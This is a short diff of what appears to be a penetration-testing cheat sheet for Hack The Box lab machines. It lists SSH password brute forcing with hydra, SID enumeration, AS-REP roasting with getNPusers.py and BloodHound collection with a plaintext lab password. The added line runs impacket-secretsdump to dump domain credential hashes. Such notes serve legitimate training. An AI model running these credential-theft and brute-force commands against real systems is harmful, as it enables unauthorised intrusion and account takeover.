@@ -32,6 +32,7 @@ hydra -l root -P password-file.txt 10.11.1.219 ssh
 #find users by bruting sids
 lookupsid.py   (impacket) or enum4linux
 python getNPusers.py EGOTISTICALBANK/  -no-pass -usersfile users.txt
+impacket-secretsdump EGOTISTICALBANK/svc_loanmgr@10.10.10.175
 bloodhound-python -c All -u svc-alfresco -p s3rvice -d htb.local -dc 10.10.10.161 -gc htb.local
 or
 runas /user:domainname\username powershell.exe and sharphound.exe
